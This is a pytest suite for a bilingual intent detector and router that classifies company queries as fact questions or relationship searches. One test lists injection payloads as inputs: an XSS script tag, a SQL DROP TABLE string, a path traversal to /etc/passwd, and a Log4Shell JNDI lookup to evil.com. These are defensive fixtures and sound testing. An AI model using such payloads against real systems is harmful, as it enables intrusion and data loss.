"""Unit tests for query intent detection and routing."""

import pytest
from unittest.mock import Mock, patch
from src.intent_detection.types import IntentType, QueryIntent, IntentDetectionConfig
from src.intent_detection.detector import KeywordIntentDetector, LLMIntentDetector
from src.intent_detection.router import IntentRouter


class TestKeywordIntentDetector:
    """Tests for keyword-based intent detection."""
    
    def test_detect_relationship_keywords_chinese(self):
        """Test detection of Chinese relationship keywords."""
        detector = KeywordIntentDetector()
        
        test_cases = [
            ("找出与腾讯相似的公司", ["相似"]),
            ("分析阿里巴巴的关联企业", ["关联"]),
            ("查找类似字节跳动的公司", ["类似"]),
            ("京东的竞品有哪些", ["竞品"]),
            ("华为的上下游供应链", ["上下游"]),
            ("比较百度和搜狗的关系", ["比较", "关系"]),
        ]
        
        for query, expected_keywords in test_cases:
            result = detector.detect(query)
            assert result.intent_type == IntentType.RELATIONSHIP_DISCOVERY
            assert result.confidence >= 0.8
            assert all(kw in result.keywords_matched for kw in expected_keywords)
            assert result.detection_method == "keyword"
    
    def test_detect_relationship_keywords_english(self):
        """Test detection of English relationship keywords."""
        detector = KeywordIntentDetector()
        
        test_cases = [
            ("Find companies similar to Apple", ["similar"]),
            ("What is the relationship between Microsoft and OpenAI", ["relationship", "between"]),
            ("Compare Google with Meta", ["compare", "with"]),
            ("Tesla's competitors in EV market", ["competitors"]),
            ("Amazon's supply chain partners", ["partners"]),
        ]
        
        for query, expected_keywords in test_cases:
            result = detector.detect(query)
            assert result.intent_type == IntentType.RELATIONSHIP_DISCOVERY
            assert result.confidence >= 0.8
            assert all(kw in result.keywords_matched for kw in expected_keywords)
    
    def test_detect_fact_qa_keywords(self):
        """Test detection of fact-based Q&A keywords."""
        detector = KeywordIntentDetector()
        
        test_cases = [
            ("What is Alibaba's revenue in 2023?", ["what is", "revenue"]),
            ("腾讯的营收是多少", ["营收", "多少"]),
            ("When was ByteDance founded?", ["when", "founded"]),
            ("京东的市值", ["市值"]),
            ("What is the P/E ratio of Tesla?", ["what is", "pe ratio"]),
        ]
        
        for query, expected_keywords in test_cases:
            result = detector.detect(query)
            assert result.intent_type == IntentType.FACT_QA
            assert result.confidence >= 0.6  # At least base confidence with keywords
            assert any(kw in result.keywords_matched for kw in expected_keywords)
    
    def test_default_to_fact_qa(self):
        """Test default classification when no keywords match."""
        detector = KeywordIntentDetector()
        
        queries = [
            "Tell me about Apple",
            "介绍一下阿里巴巴",
            "Explain quantum computing",
            "General information please",
        ]
        
        for query in queries:
            result = detector.detect(query)
            assert result.intent_type == IntentType.FACT_QA
            # Should have low confidence when no strong keywords
            if len(result.keywords_matched) == 0:
                assert result.confidence == 0.5  # Default confidence
    
    def test_empty_query(self):
        """Test handling of empty queries."""
        detector = KeywordIntentDetector()
        
        result = detector.detect("")
        assert result.intent_type == IntentType.FACT_QA
        assert result.confidence == 0.5
        assert len(result.keywords_matched) == 0
    
    def test_special_characters(self):
        """Test handling of special characters in queries."""
        detector = KeywordIntentDetector()
        
        queries = [
            "What's the relationship between A&T and B@C?",
            "Find similar companies to Meta (formerly Facebook)",
            "比较$BABA和$JD的表现",
        ]
        
        for query in queries:
            result = detector.detect(query)
            assert result.intent_type in [IntentType.FACT_QA, IntentType.RELATIONSHIP_DISCOVERY]
            assert 0.0 <= result.confidence <= 1.0
    
    def test_very_long_query(self):
        """Test handling of very long queries."""
        detector = KeywordIntentDetector()
        
        long_query = "我想了解" + "关于腾讯和阿里巴巴之间的竞争关系" * 50
        result = detector.detect(long_query)
        assert result.intent_type == IntentType.RELATIONSHIP_DISCOVERY
        assert "关系" in result.keywords_matched or "竞争" in result.keywords_matched
    
    def test_confidence_calculation(self):
        """Test confidence score calculation based on keyword matches."""
        detector = KeywordIntentDetector()
        
        # Single keyword match
        result1 = detector.detect("找类似的公司")
        assert result1.confidence >= 0.6  # Should have good confidence with strong keyword
        
        # Multiple keyword matches should have higher confidence
        result2 = detector.detect("比较这些公司之间的关系和竞争情况")
        assert result2.confidence > result1.confidence
        assert result2.confidence >= 0.8


class TestLLMIntentDetector:
    """Tests for LLM-based intent detection."""
    
    @pytest.fixture
    def mock_llm_adapter(self):
        """Create a mock LLM adapter."""
        return Mock()
    
    def test_llm_classification_relationship(self, mock_llm_adapter):
        """Test LLM classification for relationship queries."""
        mock_llm_adapter.classify_intent.return_value = {
            "intent": "relationship_discovery",
            "confidence": 0.85,
            "reasoning": "Query asks about connections between entities"
        }
        
        detector = LLMIntentDetector(llm_adapter=mock_llm_adapter)
        result = detector.detect("How are these tech companies connected?")
        
        assert result.intent_type == IntentType.RELATIONSHIP_DISCOVERY
        assert result.confidence == 0.85
        assert result.detection_method == "llm"
        mock_llm_adapter.classify_intent.assert_called_once_with("How are these tech companies connected?")
    
    def test_llm_classification_fact_qa(self, mock_llm_adapter):
        """Test LLM classification for fact-based queries."""
        mock_llm_adapter.classify_intent.return_value = {
            "intent": "fact_qa",
            "confidence": 0.92,
            "reasoning": "Query asks for specific factual information"
        }
        
        detector = LLMIntentDetector(llm_adapter=mock_llm_adapter)
        result = detector.detect("What is the market cap of Apple?")
        
        assert result.intent_type == IntentType.FACT_QA
        assert result.confidence == 0.92
        assert result.detection_method == "llm"
    
    def test_llm_error_handling(self, mock_llm_adapter):
        """Test handling of LLM errors."""
        mock_llm_adapter.classify_intent.side_effect = Exception("LLM service unavailable")
        
        detector = LLMIntentDetector(llm_adapter=mock_llm_adapter)
        result = detector.detect("Some query")
        
        assert result.intent_type == IntentType.UNKNOWN
        assert result.confidence == 0.0
        assert result.detection_method == "llm_error"
    
    def test_llm_timeout(self, mock_llm_adapter):
        """Test handling of LLM timeout."""
        import time
        from src.intent_detection.types import IntentDetectionConfig
        
        def slow_response(*args, **kwargs):
            time.sleep(6)  # Simulate slow response
            return {"intent": "fact_qa", "confidence": 0.9}
        
        mock_llm_adapter.classify_intent.side_effect = slow_response
        config = IntentDetectionConfig(timeout=5.0)
        detector = LLMIntentDetector(llm_adapter=mock_llm_adapter, config=config)
        
        with pytest.raises(TimeoutError):
            detector.detect("Some query")


class TestIntentRouter:
    """Tests for the main IntentRouter class."""
    
    @pytest.fixture
    def router(self):
        """Create an IntentRouter instance."""
        config = IntentDetectionConfig(
            keyword_threshold=0.6,
            llm_threshold=0.7,
            use_llm_fallback=True
        )
        return IntentRouter(config=config)
    
    def test_route_with_keyword_detection(self, router):
        """Test routing with keyword-based detection."""
        result = router.route_query("找出与腾讯相似的公司")
        
        assert result["intent_type"] == "relationship_discovery"
        assert result["confidence"] >= 0.6
        assert result["detection_method"] == "keyword"
        assert "route_to" in result
        assert result["route_to"] == "hybrid_retriever"
    
    def test_route_with_llm_fallback(self, router):
        """Test routing with LLM fallback for ambiguous queries."""
        # Mock the _init_llm_detector method
        mock_llm_detector = Mock()
        mock_llm_detector.detect.return_value = QueryIntent(
            query="Analyze market trends",
            intent_type=IntentType.FACT_QA,
            confidence=0.75,
            detection_method="llm",
            keywords_matched=[]
        )
        
        with patch.object(router, '_init_llm_detector') as mock_init:
            # Set the mock detector
            router._llm_detector = mock_llm_detector
            
            # Query with low keyword confidence to trigger LLM fallback
            result = router.route_query("Analyze market trends")
            
            # Should have tried LLM since keyword confidence is low
            if result["detection_method"] == "llm":
                assert result["intent_type"] == "fact_qa"
                assert result["confidence"] == 0.75
                assert result["route_to"] == "vector_retriever"
            else:
                # Keyword detection was sufficient
                assert result["detection_method"] == "keyword"
    
    def test_route_with_low_confidence(self, router):
        """Test routing when confidence is below threshold."""
        # Use a query that won't match any keywords strongly
        result = router.route_query("Random text without clear intent markers")
        
        # If it matches some weak keywords, it might get relationship_discovery
        # The important thing is that confidence is low and hint is provided
        assert result["intent_type"] in ["fact_qa", "relationship_discovery"]
        
        # If confidence is below threshold, should have hint
        if result["confidence"] < 0.6:
            assert "hint" in result
            assert "low confidence" in result["hint"].lower()
    
    def test_route_caching(self, router):
        """Test query result caching."""
        query = "What is Apple's revenue?"
        
        # First call
        result1 = router.route_query(query)
        
        # Second call should be from cache
        with patch.object(router._keyword_detector, 'detect') as mock_detect:
            result2 = router.route_query(query)
            mock_detect.assert_not_called()  # Should not call detector again
        
        assert result1 == result2
    
    def test_disable_llm_fallback(self):
        """Test router with LLM fallback disabled."""
        config = IntentDetectionConfig(use_llm_fallback=False)
        router = IntentRouter(config=config)
        
        result = router.route_query("Ambiguous query")
        assert result["detection_method"] == "keyword"
        assert result["intent_type"] == "fact_qa"  # Default
    
    def test_performance_metrics(self, router):
        """Test performance metrics collection."""
        router.route_query("测试查询")
        
        metrics = router.get_metrics()
        assert "total_queries" in metrics
        assert metrics["total_queries"] == 1
        assert "keyword_detections" in metrics
        assert "llm_detections" in metrics
        assert "avg_latency_ms" in metrics
    
    def test_logging_functionality(self, router):
        """Test comprehensive logging of classification decisions."""
        import logging
        
        # Capture log output
        with patch('src.intent_detection.router.logger') as mock_logger:
            # Test successful routing with keyword detection
            result = router.route_query("找出与阿里巴巴相似的公司")
            
            # Verify info log was called
            mock_logger.info.assert_called()
            log_call = mock_logger.info.call_args[0][0]
            
            # Check log contains required information
            assert "Query routed" in log_call
            assert "intent=relationship_discovery" in log_call
            assert "confidence=" in log_call
            assert "method=keyword" in log_call
            assert "latency=" in log_call
            
            # Test error logging
            mock_logger.reset_mock()
            with patch.object(router, '_route_query_cached', side_effect=Exception("Test error")):
                with pytest.raises(Exception):
                    router.route_query("Test query")
                
                mock_logger.error.assert_called()
                error_log = mock_logger.error.call_args[0][0]
                assert "Error routing query" in error_log
    
    def test_structured_logging(self, router):
        """Test structured logging format."""
        import json
        
        # Mock structured logger's log method to capture the actual JSON output
        with patch.object(router._structured_logger.logger, 'info') as mock_info:
            # Route a query
            router.route_query("What is ByteDance's valuation?")
            
            # Verify structured log was called
            mock_info.assert_called()
            
            # Parse the JSON log output
            log_output = mock_info.call_args[0][0]
            log_data = json.loads(log_output)
            
            # Check structured log format
            assert "query" in log_data
            assert "intent_type" in log_data
            assert "confidence" in log_data
            assert "detection_method" in log_data
            assert "latency_ms" in log_data
            assert "timestamp" in log_data
            assert "route_to" in log_data
            assert log_data["intent_type"] == "fact_qa"
    
    def test_performance_monitoring(self, router):
        """Test performance monitoring with timing."""
        # Route multiple queries
        queries = [
            "找出类似的公司",
            "What is the revenue?",
            "分析竞争关系",
            "When was it founded?"
        ]
        
        for query in queries:
            result = router.route_query(query)
            assert "latency_ms" in result
            assert result["latency_ms"] > 0
            assert result["latency_ms"] < 100  # Should be fast
        
        # Check aggregated metrics
        metrics = router.get_metrics()
        assert metrics["total_queries"] == 4
        assert metrics["avg_latency_ms"] > 0
        assert metrics["keyword_detections"] >= 4


class TestEdgeCases:
    """Tests for edge cases and error scenarios."""
    
    @pytest.fixture
    def router(self):
        """Create router with default config."""
        config = IntentDetectionConfig(use_llm_fallback=False)  # Disable LLM for faster tests
        return IntentRouter(config=config)
    
    def test_empty_queries(self, router):
        """Test handling of various empty query formats."""
        empty_queries = [
            "",
            " ",
            "   ",
            "\t",
            "\n",
            None
        ]
        
        for query in empty_queries[:-1]:  # Skip None for now
            result = router.route_query(query)
            assert result["intent_type"] == "fact_qa"
            assert result["confidence"] == 0.5
            assert "hint" in result
            assert "empty query" in result["hint"].lower()
    
    def test_none_query(self, router):
        """Test handling of None query."""
        # Should handle None gracefully by converting to empty string
        result = router.route_query(None)
        assert result["intent_type"] == "fact_qa"
        assert result["confidence"] == 0.5
        assert "hint" in result
        assert "empty query" in result["hint"].lower()
    
    def test_special_characters_injection(self, router):
        """Test handling of potential injection attempts."""
        injection_queries = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "SELECT * FROM sensitive_data",
            "../../etc/passwd",
            "%00%00%00",
            "\\x00\\x00",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for query in injection_queries:
            # Should handle gracefully without security issues
            result = router.route_query(query)
            assert result["intent_type"] in ["fact_qa", "relationship_discovery"]
            assert 0.0 <= result["confidence"] <= 1.0
            # Verify no execution or interpretation of malicious content
            assert "route_to" in result
    
    def test_unicode_edge_cases(self, router):
        """Test handling of unicode edge cases."""
        unicode_queries = [
            "🚀 Find similar companies to 🍎",  # Emojis
            "Найти похожие компании",  # Cyrillic
            "مماثلة شركات عن ابحث",  # Arabic (RTL)
            "𝕋𝕙𝕚𝕤 𝕚𝕤 𝕒 𝕢𝕦𝕖𝕣𝕪",  # Mathematical alphanumeric symbols
            "T̸͎̅h̴͉̃ỉ͕s̴̰̈ ̶̜̌ï̷͇s̸̱̾ ̴̜͐a̶̦͌ ̷̣̈ť̶̜ë̵́ͅs̴̱̈́t̴̰̾",  # Zalgo text
            "\u200b\u200c\u200d",  # Zero-width characters
            "A\u0301\u0302\u0303\u0304"  # Combining diacriticals
        ]
        
        for query in unicode_queries:
            result = router.route_query(query)
            assert result["intent_type"] in ["fact_qa", "relationship_discovery"]
            assert "route_to" in result
            assert result["latency_ms"] < 1000  # Should not hang
    
    def test_very_long_queries(self, router):
        """Test handling of extremely long queries."""
        # Test various lengths
        base_text = "Find companies similar to "
        company_name = "TechCorpInternationalGlobalEnterprises"
        
        # Build queries of specific lengths
        test_cases = []
        for target_length in [100, 500, 1000, 5000, 10000]:
            repetitions = (target_length - len(base_text)) // len(company_name) + 1
            query = base_text + company_name * repetitions
            test_cases.append((target_length, query[:target_length + 100]))  # Allow some extra
        
        for length, query in test_cases:
            assert len(query) >= length
            result = router.route_query(query)
            assert result["intent_type"] == "relationship_discovery"  # Should detect "similar"
            assert result["latency_ms"] < 200  # Should still be fast
            # Check query is truncated in logs
            assert len(result["query"]) <= len(query)
    
    def test_mixed_language_queries(self, router):
        """Test queries with mixed languages."""
        mixed_queries = [
            "Find 相似 companies to Apple公司",
            "什么是revenue of 腾讯 in 2023年",
            "Compare 阿里巴巴 with Amazon的关系"
        ]
        
        for query in mixed_queries:
            result = router.route_query(query)
            assert result["intent_type"] in ["fact_qa", "relationship_discovery"]
            assert result["confidence"] > 0.5
    
    def test_malformed_queries(self, router):
        """Test handling of malformed queries."""
        malformed_queries = [
            "((()))",
            "???!!!###",
            "....",
            "____",
            "[[[[]]]]",
            "{{{test}}}",
            "\\\\\\\\",
            "||||",
            "~~~~"
        ]
        
        for query in malformed_queries:
            result = router.route_query(query)
            assert result["intent_type"] == "fact_qa"  # Should default
            assert result["confidence"] == 0.5  # Low confidence
            assert "route_to" in result
    
    def test_concurrent_queries(self, router):
        """Test handling of concurrent queries (cache safety)."""
        import threading
        import time
        
        results = []
        errors = []
        
        def route_query(query, index):
            try:
                result = router.route_query(query)
                results.append((index, result))
            except Exception as e:
                errors.append((index, str(e)))
        
        # Create threads for concurrent access
        threads = []
        queries = [
            "Find similar companies to Tesla",
            "What is Apple's revenue?",
            "分析竞争关系",
            "Market cap of Microsoft"
        ] * 5  # 20 queries total
        
        for i, query in enumerate(queries):
            thread = threading.Thread(target=route_query, args=(query, i))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join(timeout=5.0)
        
        # Verify results
        assert len(errors) == 0, f"Errors occurred: {errors}"
        assert len(results) == 20
        
        # Check all results are valid
        for index, result in results:
            assert "intent_type" in result
            assert "route_to" in result
            assert result["latency_ms"] > 0